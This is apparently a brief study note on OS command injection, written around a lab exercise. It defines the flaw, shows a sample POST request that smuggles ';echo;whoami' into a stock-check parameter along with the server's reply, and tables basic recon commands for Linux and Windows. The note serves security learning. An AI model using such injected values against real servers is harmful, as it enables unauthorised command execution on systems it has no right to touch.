##### ***What is OS command injection?***
OS command injection is a web vulnerability that allows an attacker to input malicious commands into a user supplied input value, that if not properly sanitized, allows the attacker to execute commands on the server.
##### ***Simple OS command injection***
This is a very simple example of a web application that does not filter or block command injection, in this POST request it checks for the stock of a product, simply use a semi-colon `;` to escape the existing request parameter and inject an `echo whoami` command to test for OS injection:
```
POST /product/stock HTTP/2
Host: vulnerable-website.com
productId=1&storeId=1;echo;whoami
---
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

62

peter-atwJzm
```
##### ***Useful commands***
|Command|Linux|Windows|
|---|---|---|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconfig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|
##### ***Blind OS command injection***

##### ***Resources***
https://portswigger.net/web-security/os-command-injection
https://book.hacktricks.xyz/pentesting-web/command-injection